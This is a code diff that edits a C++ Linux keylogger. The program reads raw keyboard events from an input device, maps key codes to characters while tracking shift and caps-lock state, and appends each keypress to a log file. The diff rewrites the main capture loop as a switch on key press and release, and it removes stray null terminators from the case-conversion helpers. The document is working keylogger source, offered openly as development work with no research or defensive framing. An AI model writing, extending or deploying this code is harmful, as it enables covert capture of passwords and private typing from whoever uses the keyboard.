@@ -66,40 +66,44 @@ int main(){
 	int lastKey = 0;
 
 	std::string mappedKey; 
-	while(1){
 
-		std::ofstream logFile;
-		logFile.open(loggerMetaData.pathToOutput, std::ios::app);
+	while(1){
 
 		struct KeyboardEvent keyboardEvent;
 		int readKeyboardHook = read(keyboardEventHook, &keyboardEvent, sizeof(struct KeyboardEvent));
 
-		if(readKeyboardHook <= 0)
-			continue;
+		switch(keyboardEvent.value){
+			case 0: 	//Key Released
+				if(keymap[keyboardEvent.code].find("SHIFT") != std::string::npos)
+					capsLock = !capsLock;
+				break;
+			case 1: 	//Key Press
+			{
+				std::ofstream logFile;
+				logFile.open(loggerMetaData.pathToOutput, std::ios::app);
 
-		if(keyboardEvent.value != 1)
-			continue;
-		else 
-			lastKey = keyboardEvent.code;
-
-		mappedKey = keymap[lastKey];		
-	
-
-		if(mappedKey.find("[CAPS LOCK]") != std::string::npos){
-			capsLock = !capsLock;
-		}
-
-		if(mappedKey.find("[") == std::string::npos){
-			if(capsLock){
-				mappedKey = convertToUpper(mappedKey);
-			}else{
-				mappedKey = convertToLower(mappedKey);
+				mappedKey = keymap[keyboardEvent.code];
+				if(mappedKey.find("[CAPS LOCK]") != std::string::npos || mappedKey.find("SHIFT") != std::string::npos)
+					capsLock = !capsLock;
+				else{
+					
+					if(mappedKey.find("[") == std::string::npos){
+						if(capsLock){
+							mappedKey = convertToUpper(mappedKey);
+						}else{
+							mappedKey = convertToLower(mappedKey);
+						}
+					}
+					logFile << mappedKey;
+					logFile.flush();
+					logFile.close();
+				}
+				break;
 			}
+			default:
+				continue;
+				break;
 		}
-
-		logFile << mappedKey;
-		logFile.flush();	
-		logFile.close();
 	}
 	return 0;
 }
@@ -123,7 +127,6 @@ const std::string convertToUpper(std::string text){
 	for(char c : text){
 		upperString += toupper(c);
 	}
-	upperString += '\0';
 	return upperString;
 }
 
@@ -132,6 +135,5 @@ const std::string convertToLower(std::string text){
 	for(char c : text){
 		lowerString += tolower(c);
 	}
-	lowerString += '\0';
 	return lowerString;
 }
